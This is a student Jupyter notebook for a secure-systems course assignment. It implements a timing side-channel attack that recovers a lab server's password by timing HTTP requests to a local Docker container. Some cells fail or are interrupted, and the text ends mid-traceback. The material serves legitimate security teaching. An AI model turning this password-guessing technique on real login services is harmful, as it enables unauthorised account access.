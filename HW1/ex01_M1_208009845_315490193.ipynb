{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "n-MtEVKgteed"
      },
      "source": [
        "# Attacks on Implementations of Secure Systems Assignment 1"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "YpaA0_mjsQxm"
      },
      "source": [
        "## Commands used for docker\n",
        "```bash\n",
        "docker pull amarmic/attacks_on_implementations:Assignment1_x86_64\n",
        "docker run --name ass1 -p 80:8080 amarmic/attacks_on_implementations:Assignment1_x86_64\n",
        "```\n",
        "\n",
        "## Commands used for Anaconda to test locally\n",
        "```bash\n",
        "conda create --name side_attacks python=3.12\n",
        "conda install requests\n",
        "```\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "9OTeLRx43jQu"
      },
      "source": [
        "### Imports"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 2,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Collecting scipy\n",
            "  Downloading scipy-1.15.2-cp313-cp313-win_amd64.whl.metadata (60 kB)\n",
            "Collecting numpy<2.5,>=1.23.5 (from scipy)\n",
            "  Downloading numpy-2.2.4-cp313-cp313-win_amd64.whl.metadata (60 kB)\n",
            "Downloading scipy-1.15.2-cp313-cp313-win_amd64.whl (41.0 MB)\n",
            "   ---------------------------------------- 0.0/41.0 MB ? eta -:--:--\n",
            "   - -------------------------------------- 1.0/41.0 MB 6.0 MB/s eta 0:00:07\n",
            "   ---- ----------------------------------- 4.5/41.0 MB 12.8 MB/s eta 0:00:03\n",
            "   -------- ------------------------------- 8.4/41.0 MB 15.1 MB/s eta 0:00:03\n",
            "   ------------- -------------------------- 13.4/41.0 MB 17.4 MB/s eta 0:00:02\n",
            "   ---------------- ----------------------- 17.3/41.0 MB 17.9 MB/s eta 0:00:02\n",
            "   --------------------- ------------------ 22.0/41.0 MB 18.9 MB/s eta 0:00:02\n",
            "   ------------------------- -------------- 26.0/41.0 MB 18.9 MB/s eta 0:00:01\n",
            "   ---------------------------- ----------- 29.4/41.0 MB 18.6 MB/s eta 0:00:01\n",
            "   -------------------------------- ------- 33.0/41.0 MB 18.4 MB/s eta 0:00:01\n",
            "   ----------------------------------- ---- 36.7/41.0 MB 18.5 MB/s eta 0:00:01\n",
            "   ---------------------------------------  40.9/41.0 MB 18.6 MB/s eta 0:00:01\n",
            "   ---------------------------------------- 41.0/41.0 MB 18.4 MB/s eta 0:00:00\n",
            "Downloading numpy-2.2.4-cp313-cp313-win_amd64.whl (12.6 MB)\n",
            "   ---------------------------------------- 0.0/12.6 MB ? eta -:--:--\n",
            "   ------------ --------------------------- 3.9/12.6 MB 20.3 MB/s eta 0:00:01\n",
            "   --------------------------- ------------ 8.7/12.6 MB 22.2 MB/s eta 0:00:01\n",
            "   ---------------------------------------- 12.6/12.6 MB 22.3 MB/s eta 0:00:00\n",
            "Installing collected packages: numpy, scipy\n",
            "Successfully installed numpy-2.2.4 scipy-1.15.2\n",
            "Collecting requests\n",
            "  Downloading requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)\n",
            "Collecting charset-normalizer<4,>=2 (from requests)\n",
            "  Downloading charset_normalizer-3.4.1-cp313-cp313-win_amd64.whl.metadata (36 kB)\n",
            "Collecting idna<4,>=2.5 (from requests)\n",
            "  Downloading idna-3.10-py3-none-any.whl.metadata (10 kB)\n",
            "Collecting urllib3<3,>=1.21.1 (from requests)\n",
            "  Downloading urllib3-2.3.0-py3-none-any.whl.metadata (6.5 kB)\n",
            "Collecting certifi>=2017.4.17 (from requests)\n",
            "  Downloading certifi-2025.1.31-py3-none-any.whl.metadata (2.5 kB)\n",
            "Downloading requests-2.32.3-py3-none-any.whl (64 kB)\n",
            "Downloading certifi-2025.1.31-py3-none-any.whl (166 kB)\n",
            "Downloading charset_normalizer-3.4.1-cp313-cp313-win_amd64.whl (102 kB)\n",
            "Downloading idna-3.10-py3-none-any.whl (70 kB)\n",
            "Downloading urllib3-2.3.0-py3-none-any.whl (128 kB)\n",
            "Installing collected packages: urllib3, idna, charset-normalizer, certifi, requests\n",
            "Successfully installed certifi-2025.1.31 charset-normalizer-3.4.1 idna-3.10 requests-2.32.3 urllib3-2.3.0\n"
          ]
        }
      ],
      "source": [
        "%pip install scipy\n",
        "%pip install requests"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 3,
      "metadata": {
        "id": "C4_4E9-43Vrf"
      },
      "outputs": [],
      "source": [
        "import requests\n",
        "import time\n",
        "from scipy import stats"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "zlpn9Gl93kwr"
      },
      "source": [
        "### Constants"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "gGeu_uCs3mrw"
      },
      "outputs": [],
      "source": [
        "base_url = \"http://localhost\"\n",
        "name = \"208009845\"\n",
        "difficulty = \"1\" # const for first difficuly\n",
        "max_PASSWORD_LENGTH = 32\n",
        "amount_of_repeats = 3\n",
        "possible_chars = \"abcdefghijklmnopqrstuvwxyz\"\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "YV81TRXEwQnF"
      },
      "source": [
        "## Solution for difficulty 1\n",
        "With difficulty 1, the password length is variable, so we need first to find the length.\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 29,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Response:  http://localhost/?user=208009845&password=parshandata\n",
            "correct password\n"
          ]
        }
      ],
      "source": [
        "password = \"parshandata\"\n",
        "response = requests.get(f\"{base_url}/?user={name}&password={password}\")\n",
        "print(\"Response: \", response.url)\n",
        "if response.status_code != 200 : # sanity check\n",
        "  print(\"Error: \", response.status_code)\n",
        "\n",
        "if response.text == \"1\":\n",
        "   print(\"correct password\")\n",
        "else:\n",
        "   print(\"incorrect password\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 9,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 663
        },
        "id": "Kr8GZJLGwXvi",
        "outputId": "eea3f658-6f55-4ac6-9d70-24486b2f6afa"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Password length: 11, Time: 0.5066157182057699\n"
          ]
        }
      ],
      "source": [
        "# Find length of password\n",
        "# here we save the time of the query for each password length\n",
        "vector_iterations = [[] for _ in range(max_PASSWORD_LENGTH-1)]\n",
        "for PASSWORD_LENGTH in range(1,max_PASSWORD_LENGTH): \n",
        "  password = \"a\" * PASSWORD_LENGTH\n",
        "  for iteration in range(amount_of_repeats):\n",
        "    start = time.time()\n",
        "    response = requests.get(f\"{base_url}/?user={name}&password={password}\")#&difficulty={difficulty}\")\n",
        "    end = time.time()\n",
        "    if response.status_code != 200: # sanity check\n",
        "      print(\"Error: \", response.status_code)\n",
        "      break\n",
        "    time_of_query = end - start\n",
        "    vector_iterations[PASSWORD_LENGTH-1].append(time_of_query)\n",
        "\n",
        "# calculate avg time for each password length\n",
        "PASSWORD_LENGTH, max_avg = 0, 0\n",
        "for i in range(len(vector_iterations)):\n",
        "  vector_iterations[i] = sum(vector_iterations[i]) / len(vector_iterations[i])\n",
        "  if vector_iterations[i] > max_avg:\n",
        "    max_avg = vector_iterations[i]\n",
        "    PASSWORD_LENGTH = i+1\n",
        "  \n",
        "print(f\"Password length: {PASSWORD_LENGTH}, Time: {vector_iterations[PASSWORD_LENGTH-1]}\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 4,
      "metadata": {},
      "outputs": [
        {
          "ename": "NameError",
          "evalue": "name 'password_length' is not defined",
          "output_type": "error",
          "traceback": [
            "\u001b[31m---------------------------------------------------------------------------\u001b[39m",
            "\u001b[31mNameError\u001b[39m                                 Traceback (most recent call last)",
            "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[4]\u001b[39m\u001b[32m, line 105\u001b[39m\n\u001b[32m    102\u001b[39m   \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[32m    103\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[33m\"\u001b[39m\u001b[33mNOT_FOUND\u001b[39m\u001b[33m\"\u001b[39m\n\u001b[32m--> \u001b[39m\u001b[32m105\u001b[39m password = \u001b[43mfind_password\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    106\u001b[39m \u001b[38;5;28mprint\u001b[39m(\u001b[33mf\u001b[39m\u001b[33m\"\u001b[39m\u001b[33mPassword: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mpassword\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m\"\u001b[39m)\n",
            "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[4]\u001b[39m\u001b[32m, line 49\u001b[39m, in \u001b[36mfind_password\u001b[39m\u001b[34m()\u001b[39m\n\u001b[32m     47\u001b[39m \u001b[38;5;28;01mdef\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34mfind_password\u001b[39m():\n\u001b[32m     48\u001b[39m   password = \u001b[33m\"\u001b[39m\u001b[33m\"\u001b[39m \u001b[38;5;66;03m# password to return\u001b[39;00m\n\u001b[32m---> \u001b[39m\u001b[32m49\u001b[39m   \u001b[38;5;28;01mwhile\u001b[39;00m (\u001b[38;5;28mlen\u001b[39m(password) <= \u001b[43mpassword_length\u001b[49m):\n\u001b[32m     50\u001b[39m     max_time_index, max_time = \u001b[32m0\u001b[39m, \u001b[32m0\u001b[39m\n\u001b[32m     51\u001b[39m     vector_iterations = [[] \u001b[38;5;28;01mfor\u001b[39;00m _ \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mrange\u001b[39m(\u001b[38;5;28mlen\u001b[39m(possible_chars))]\n",
            "\u001b[31mNameError\u001b[39m: name 'password_length' is not defined"
          ]
        }
      ],
      "source": [
        "import numpy as np\n",
        "\n",
        "min_letters = 5\n",
        "alpha = 0.0005\n",
        "amount_of_repeats = 3\n",
        "\n",
        "def majority_t_test(data, popmean):\n",
        "  majority_list = []\n",
        "  for iteration in range(amount_of_repeats):\n",
        "    if t_test(data, popmean[iteration]):\n",
        "      majority_list.append(True)\n",
        "    else:\n",
        "      majority_list.append(False)\n",
        "  if majority_list.count(True) > amount_of_repeats // 2:\n",
        "    return True\n",
        "  return False\n",
        "  \n",
        "def t_test(data, popmean):\n",
        "  flat_list = [item for sublist in data for item in sublist]\n",
        "  t_stat, p_val = stats.ttest_1samp(flat_list, popmean, alternative='less')\n",
        "  if p_val < alpha:\n",
        "    return True\n",
        "  return False\n",
        "\n",
        "def remove_outliers(data):\n",
        "    q25, q75 = np.percentile(data, 25), np.percentile(data, 75)\n",
        "    iqr = q75 - q25\n",
        "    return [x for x in data if (x <= q75 + 1.5 * iqr)]\n",
        "\n",
        "\n",
        "def get_dynamic_alpha(password_so_far, min_alpha=0.005, max_alpha=0.0001):\n",
        "    \"\"\"\n",
        "    Calculate a dynamic alpha value that becomes more strict as we discover more characters.\n",
        "    \n",
        "    Args:\n",
        "        password_so_far: Currently discovered partial password\n",
        "        min_alpha: Minimum allowed alpha value (lower bound)\n",
        "        max_alpha: Maximum allowed alpha value (upper bound)\n",
        "    \n",
        "    Returns:\n",
        "        Dynamically calculated alpha value\n",
        "    \"\"\"\n",
        "    # Exponential decrease in alpha as password length increases\n",
        "    # We become more strict (require stronger evidence) as we progress\n",
        "    return max(min_alpha, max_alpha * (0.7 ** len(password_so_far)))\n",
        "    \n",
        "def find_password():\n",
        "  password = \"\" # password to return\n",
        "  while (len(password) <= PASSWORD_LENGTH):\n",
        "    max_time_index, max_time = 0, 0\n",
        "    vector_iterations = [[] for _ in range(len(possible_chars))]\n",
        "    current_index_of_password = len(password) #what index we are trying to brute force\n",
        "    for index_char_to_check in range(len(possible_chars)):\n",
        "      print(possible_chars[index_char_to_check], end=\"\") #for debugging purposes\n",
        "      password_to_check = password + possible_chars[index_char_to_check] * (PASSWORD_LENGTH - current_index_of_password)\n",
        "      for _ in range(amount_of_repeats):\n",
        "        start = time.time()\n",
        "        response = requests.get(f\"{base_url}/?user={name}&password={password_to_check}\")#&difficulty={difficulty}\")\n",
        "        end = time.time()\n",
        "        if response.status_code == 200 and response.text == \"1\":\n",
        "          return password_to_check\n",
        "        vector_iterations[index_char_to_check].append(end - start)\n",
        "\n",
        "        # perform t-test to see if it's an small outlier \n",
        "        #TODO\n",
        "    \n",
        "      #vector_iterations[index_char_to_check] = remove_outliers_and_avg(vector_iterations[index_char_to_check])\n",
        "\n",
        "      \n",
        "\n",
        "\n",
        "      if max(vector_iterations[index_char_to_check]) > max_time:\n",
        "        max_time = max(vector_iterations[index_char_to_check])\n",
        "        max_time_index = index_char_to_check\n",
        "      \n",
        "\n",
        "      if index_char_to_check == min_letters-1:\n",
        "        found = False\n",
        "        for i in range(min_letters):\n",
        "          sample = vector_iterations[:i] + vector_iterations[i+1:min_letters]\n",
        "          if majority_t_test(sample, vector_iterations[i]):\n",
        "            password += possible_chars[i]\n",
        "            print(f\"\\nPassword: {password}, time: {vector_iterations[i]}\") #,p-value: {p_val}\n",
        "            print(vector_iterations[:index_char_to_check+1])\n",
        "            found = True\n",
        "        if found: break\n",
        "        else: continue\n",
        "\n",
        "      # t-test\n",
        "      if index_char_to_check > min_letters -1 and max_time_index == index_char_to_check:\n",
        "        sample = vector_iterations[:index_char_to_check]\n",
        "        if majority_t_test(sample, vector_iterations[index_char_to_check]):\n",
        "          password += possible_chars[index_char_to_check]\n",
        "          print(f\"\\nPassword: {password}, time: {vector_iterations[index_char_to_check]}\") #,p-value: {p_val}\n",
        "          print(vector_iterations[:index_char_to_check+1])\n",
        "          break   \n",
        "        \n",
        "      \n",
        "    else: #go back a letter  \n",
        "        password = password[:-1]\n",
        "        print(\"We did not find a char, the new password is: \", password)\n",
        "  else:\n",
        "    return \"NOT_FOUND\"\n",
        "\n",
        "password = find_password()\n",
        "print(f\"Password: {password}\")\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "\n",
            "[+] Guessing character at position 1\n",
            "    Tried 'aaaaaaaaaaa' | Median Time: 30.31188s\n",
            "    Tried 'baaaaaaaaaa' | Median Time: 30.33250s\n",
            "    Tried 'caaaaaaaaaa' | Median Time: 30.34495s\n",
            "    Tried 'daaaaaaaaaa' | Median Time: 30.32755s\n"
          ]
        },
        {
          "ename": "KeyboardInterrupt",
          "evalue": "",
          "output_type": "error",
          "traceback": [
            "\u001b[31m---------------------------------------------------------------------------\u001b[39m",
            "\u001b[31mKeyboardInterrupt\u001b[39m                         Traceback (most recent call last)",
            "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[9]\u001b[39m\u001b[32m, line 143\u001b[39m\n\u001b[32m    137\u001b[39m                 \u001b[38;5;28mprint\u001b[39m(\u001b[33mf\u001b[39m\u001b[33m\"\u001b[39m\u001b[33m    Tried \u001b[39m\u001b[33m'\u001b[39m\u001b[38;5;132;01m{\u001b[39;00mtrial\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m'\u001b[39m\u001b[33m\"\u001b[39m)\n\u001b[32m    142\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m \u001b[34m__name__\u001b[39m == \u001b[33m\"\u001b[39m\u001b[33m__main__\u001b[39m\u001b[33m\"\u001b[39m:\n\u001b[32m--> \u001b[39m\u001b[32m143\u001b[39m     password = \u001b[43mguess_password\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    145\u001b[39m     \u001b[38;5;28mprint\u001b[39m(\u001b[33mf\u001b[39m\u001b[33m\"\u001b[39m\u001b[38;5;130;01m\\n\u001b[39;00m\u001b[33m[✓] The password is \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mpassword\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m\"\u001b[39m)\n\u001b[32m    147\u001b[39m \u001b[38;5;66;03m# to calculate the median instead of avg\u001b[39;00m\n\u001b[32m    148\u001b[39m \u001b[38;5;66;03m# at first find the difference between the max and the min and define as the margin\u001b[39;00m\n\u001b[32m    149\u001b[39m \u001b[38;5;66;03m# each time we multiply the margin by let's say 0.8/0.85\u001b[39;00m\n\u001b[32m    150\u001b[39m \u001b[38;5;66;03m# calc at least 3 or 5 chars to determine the result\u001b[39;00m\n",
            "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[9]\u001b[39m\u001b[32m, line 45\u001b[39m, in \u001b[36mguess_password\u001b[39m\u001b[34m()\u001b[39m\n\u001b[32m     43\u001b[39m times_list = []\n\u001b[32m     44\u001b[39m \u001b[38;5;28;01mfor\u001b[39;00m _ \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mrange\u001b[39m(REPEATS):\n\u001b[32m---> \u001b[39m\u001b[32m45\u001b[39m     response_time, response = \u001b[43mtime_request\u001b[49m\u001b[43m(\u001b[49m\u001b[43mtrial\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m     46\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m response == \u001b[33m\"\u001b[39m\u001b[33m1\u001b[39m\u001b[33m\"\u001b[39m:\n\u001b[32m     47\u001b[39m         log_result(trial, password_tries, time.time() - start_time_all_password)\n",
            "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[9]\u001b[39m\u001b[32m, line 22\u001b[39m, in \u001b[36mtime_request\u001b[39m\u001b[34m(password_guess)\u001b[39m\n\u001b[32m     20\u001b[39m     url = \u001b[33mf\u001b[39m\u001b[33m\"\u001b[39m\u001b[38;5;132;01m{\u001b[39;00mBASE_URL\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m/?user=\u001b[39m\u001b[38;5;132;01m{\u001b[39;00mUSERNAME\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m&password=\u001b[39m\u001b[38;5;132;01m{\u001b[39;00mpassword_guess\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m&difficulty=\u001b[39m\u001b[38;5;132;01m{\u001b[39;00mDIFFICULTY\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m\"\u001b[39m\n\u001b[32m     21\u001b[39m start = time.time()\n\u001b[32m---> \u001b[39m\u001b[32m22\u001b[39m response = \u001b[43mrequests\u001b[49m\u001b[43m.\u001b[49m\u001b[43mget\u001b[49m\u001b[43m(\u001b[49m\u001b[43murl\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m     23\u001b[39m end = time.time()\n\u001b[32m     24\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m end - start, response.text.strip()\n",
            "\u001b[36mFile \u001b[39m\u001b[32mc:\\Users\\chenf\\Documents\\Github\\side-channels-attacks\\.venv\\Lib\\site-packages\\requests\\api.py:73\u001b[39m, in \u001b[36mget\u001b[39m\u001b[34m(url, params, **kwargs)\u001b[39m\n\u001b[32m     62\u001b[39m \u001b[38;5;28;01mdef\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34mget\u001b[39m(url, params=\u001b[38;5;28;01mNone\u001b[39;00m, **kwargs):\n\u001b[32m     63\u001b[39m \u001b[38;5;250m    \u001b[39m\u001b[33mr\u001b[39m\u001b[33;03m\"\"\"Sends a GET request.\u001b[39;00m\n\u001b[32m     64\u001b[39m \n\u001b[32m     65\u001b[39m \u001b[33;03m    :param url: URL for the new :class:`Request` object.\u001b[39;00m\n\u001b[32m   (...)\u001b[39m\u001b[32m     70\u001b[39m \u001b[33;03m    :rtype: requests.Response\u001b[39;00m\n\u001b[32m     71\u001b[39m \u001b[33;03m    \"\"\"\u001b[39;00m\n\u001b[32m---> \u001b[39m\u001b[32m73\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43mrequest\u001b[49m\u001b[43m(\u001b[49m\u001b[33;43m\"\u001b[39;49m\u001b[33;43mget\u001b[39;49m\u001b[33;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43murl\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mparams\u001b[49m\u001b[43m=\u001b[49m\u001b[43mparams\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n",
            "\u001b[36mFile \u001b[39m\u001b[32mc:\\Users\\chenf\\Documents\\Github\\side-channels-attacks\\.venv\\Lib\\site-packages\\requests\\api.py:59\u001b[39m, in \u001b[36mrequest\u001b[39m\u001b[34m(method, url, **kwargs)\u001b[39m\n\u001b[32m     55\u001b[39m \u001b[38;5;66;03m# By using the 'with' statement we are sure the session is closed, thus we\u001b[39;00m\n\u001b[32m     56\u001b[39m \u001b[38;5;66;03m# avoid leaving sockets open which can trigger a ResourceWarning in some\u001b[39;00m\n\u001b[32m     57\u001b[39m \u001b[38;5;66;03m# cases, and look like a memory leak in others.\u001b[39;00m\n\u001b[32m     58\u001b[39m \u001b[38;5;28;01mwith\u001b[39;00m sessions.Session() \u001b[38;5;28;01mas\u001b[39;00m session:\n\u001b[32m---> \u001b[39m\u001b[32m59\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43msession\u001b[49m\u001b[43m.\u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m(\u001b[49m\u001b[43mmethod\u001b[49m\u001b[43m=\u001b[49m\u001b[43mmethod\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43murl\u001b[49m\u001b[43m=\u001b[49m\u001b[43murl\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n",
            "\u001b[36mFile \u001b[39m\u001b[32mc:\\Users\\chenf\\Documents\\Github\\side-channels-attacks\\.venv\\Lib\\site-packages\\requests\\sessions.py:589\u001b[39m, in \u001b[36mSession.request\u001b[39m\u001b[34m(self, method, url, params, data, headers, cookies, files, auth, timeout, allow_redirects, proxies, hooks, stream, verify, cert, json)\u001b[39m\n\u001b[32m    584\u001b[39m send_kwargs = {\n\u001b[32m    585\u001b[39m     \u001b[33m\"\u001b[39m\u001b[33mtimeout\u001b[39m\u001b[33m\"\u001b[39m: timeout,\n\u001b[32m    586\u001b[39m     \u001b[33m\"\u001b[39m\u001b[33mallow_redirects\u001b[39m\u001b[33m\"\u001b[39m: allow_redirects,\n\u001b[32m    587\u001b[39m }\n\u001b[32m    588\u001b[39m send_kwargs.update(settings)\n\u001b[32m--> \u001b[39m\u001b[32m589\u001b[39m resp = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43msend\u001b[49m\u001b[43m(\u001b[49m\u001b[43mprep\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43msend_kwargs\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    591\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m resp\n",
            "\u001b[36mFile \u001b[39m\u001b[32mc:\\Users\\chenf\\Documents\\Github\\side-channels-attacks\\.venv\\Lib\\site-packages\\requests\\sessions.py:703\u001b[39m, in \u001b[36mSession.send\u001b[39m\u001b[34m(self, request, **kwargs)\u001b[39m\n\u001b[32m    700\u001b[39m start = preferred_clock()\n\u001b[32m    702\u001b[39m \u001b[38;5;66;03m# Send the request\u001b[39;00m\n\u001b[32m--> \u001b[39m\u001b[32m703\u001b[39m r = \u001b[43madapter\u001b[49m\u001b[43m.\u001b[49m\u001b[43msend\u001b[49m\u001b[43m(\u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    705\u001b[39m \u001b[38;5;66;03m# Total elapsed time of the request (approximately)\u001b[39;00m\n\u001b[32m    706\u001b[39m elapsed = preferred_clock() - start\n",
            "\u001b[36mFile \u001b[39m\u001b[32mc:\\Users\\chenf\\Documents\\Github\\side-channels-attacks\\.venv\\Lib\\site-packages\\requests\\adapters.py:667\u001b[39m, in \u001b[36mHTTPAdapter.send\u001b[39m\u001b[34m(self, request, stream, timeout, verify, cert, proxies)\u001b[39m\n\u001b[32m    664\u001b[39m     timeout = TimeoutSauce(connect=timeout, read=timeout)\n\u001b[32m    666\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m667\u001b[39m     resp = \u001b[43mconn\u001b[49m\u001b[43m.\u001b[49m\u001b[43murlopen\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    668\u001b[39m \u001b[43m        \u001b[49m\u001b[43mmethod\u001b[49m\u001b[43m=\u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m.\u001b[49m\u001b[43mmethod\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    669\u001b[39m \u001b[43m        \u001b[49m\u001b[43murl\u001b[49m\u001b[43m=\u001b[49m\u001b[43murl\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    670\u001b[39m \u001b[43m        \u001b[49m\u001b[43mbody\u001b[49m\u001b[43m=\u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m.\u001b[49m\u001b[43mbody\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    671\u001b[39m \u001b[43m        \u001b[49m\u001b[43mheaders\u001b[49m\u001b[43m=\u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m.\u001b[49m\u001b[43mheaders\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    672\u001b[39m \u001b[43m        \u001b[49m\u001b[43mredirect\u001b[49m\u001b[43m=\u001b[49m\u001b[38;5;28;43;01mFalse\u001b[39;49;00m\u001b[43m,\u001b[49m\n\u001b[32m    673\u001b[39m \u001b[43m        \u001b[49m\u001b[43massert_same_host\u001b[49m\u001b[43m=\u001b[49m\u001b[38;5;28;43;01mFalse\u001b[39;49;00m\u001b[43m,\u001b[49m\n\u001b[32m    674\u001b[39m \u001b[43m        \u001b[49m\u001b[43mpreload_content\u001b[49m\u001b[43m=\u001b[49m\u001b[38;5;28;43;01mFalse\u001b[39;49;00m\u001b[43m,\u001b[49m\n\u001b[32m    675\u001b[39m \u001b[43m        \u001b[49m\u001b[43mdecode_content\u001b[49m\u001b[43m=\u001b[49m\u001b[38;5;28;43;01mFalse\u001b[39;49;00m\u001b[43m,\u001b[49m\n\u001b[32m    676\u001b[39m \u001b[43m        \u001b[49m\u001b[43mretries\u001b[49m\u001b[43m=\u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43mmax_retries\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    677\u001b[39m \u001b[43m        \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m=\u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    678\u001b[39m \u001b[43m        \u001b[49m\u001b[43mchunked\u001b[49m\u001b[43m=\u001b[49m\u001b[43mchunked\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    679\u001b[39m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    681\u001b[39m \u001b[38;5;28;01mexcept\u001b[39;00m (ProtocolError, \u001b[38;5;167;01mOSError\u001b[39;00m) \u001b[38;5;28;01mas\u001b[39;00m err:\n\u001b[32m    682\u001b[39m     \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mConnectionError\u001b[39;00m(err, request=request)\n",
            "\u001b[36mFile \u001b[39m\u001b[32mc:\\Users\\chenf\\Documents\\Github\\side-channels-attacks\\.venv\\Lib\\site-packages\\urllib3\\connectionpool.py:787\u001b[39m, in \u001b[36mHTTPConnectionPool.urlopen\u001b[39m\u001b[34m(self, method, url, body, headers, retries, redirect, assert_same_host, timeout, pool_timeout, release_conn, chunked, body_pos, preload_content, decode_content, **response_kw)\u001b[39m\n\u001b[32m    784\u001b[39m response_conn = conn \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m release_conn \u001b[38;5;28;01melse\u001b[39;00m \u001b[38;5;28;01mNone\u001b[39;00m\n\u001b[32m    786\u001b[39m \u001b[38;5;66;03m# Make the request on the HTTPConnection object\u001b[39;00m\n\u001b[32m--> \u001b[39m\u001b[32m787\u001b[39m response = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_make_request\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    788\u001b[39m \u001b[43m    \u001b[49m\u001b[43mconn\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    789\u001b[39m \u001b[43m    \u001b[49m\u001b[43mmethod\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    790\u001b[39m \u001b[43m    \u001b[49m\u001b[43murl\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    791\u001b[39m \u001b[43m    \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m=\u001b[49m\u001b[43mtimeout_obj\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    792\u001b[39m \u001b[43m    \u001b[49m\u001b[43mbody\u001b[49m\u001b[43m=\u001b[49m\u001b[43mbody\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    793\u001b[39m \u001b[43m    